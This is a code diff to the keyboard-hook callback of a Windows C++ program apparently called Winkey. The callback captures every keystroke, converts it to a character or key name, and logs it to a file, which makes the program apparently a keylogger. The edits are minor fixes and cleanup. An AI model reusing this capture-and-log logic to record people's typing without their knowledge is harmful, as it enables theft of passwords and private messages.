@@ -174,7 +174,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
         GetKeyboardState(keyboardState);
 
         // Set modifier keys manually
-        if (GetAsyncKeyState(VK_SHIFT)  & 0x8000)
+        if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
             keyboardState[VK_SHIFT] |= 0x80;
         if (GetKeyState(VK_CAPITAL) & 0x0001) // toggle bit, not pressed
             keyboardState[VK_CAPITAL] |= 0x01;
@@ -203,14 +203,15 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          *  - Represents the physical location of the key on the keyboard.
          */
         
-        if (lastVkCode > VK_OEM_2 && lastVkCode < VK_OEM_8) {
-            ToUnicodeEx(
-                    p->vkCode, p->scanCode, keyboardState,
-                    buffer, TW_KEYSTROKE_MAX,
-                    0,
-                    layout
-                );
-        }
+        // if (lastVkCode > VK_OEM_2 && lastVkCode < VK_OEM_8) {
+        //     std::cout<< "heeere 0"<<std::endl;
+        //     ToUnicodeEx(
+        //             p->vkCode, p->scanCode, keyboardState,
+        //             buffer, TW_KEYSTROKE_MAX,
+        //             0,
+        //             layout
+        //         );
+        // }
     
         int result = ToUnicodeEx(
             p->vkCode, p->scanCode, keyboardState,
@@ -218,8 +219,6 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
             0,
             layout
         );
-        
-        buffer[result] = L'\0';
 
         /* 
          * Log character to file or, if no valid character was produced
@@ -227,11 +226,12 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
          *  the virtual key code.
          */
 
-        if (result > 0 && isPrintable(buffer[0]))
+        if (result > 0 && isPrintable(buffer[0])) {
+            buffer[result] = L'\0';
             _keyStroke = buffer;
+        } 
         else {
-            std::wstring    keyName = getKeyName(p->vkCode);
-            _keyStroke = keyName;
+            _keyStroke = getKeyName(p->vkCode);;
         }
 
         logToFile();
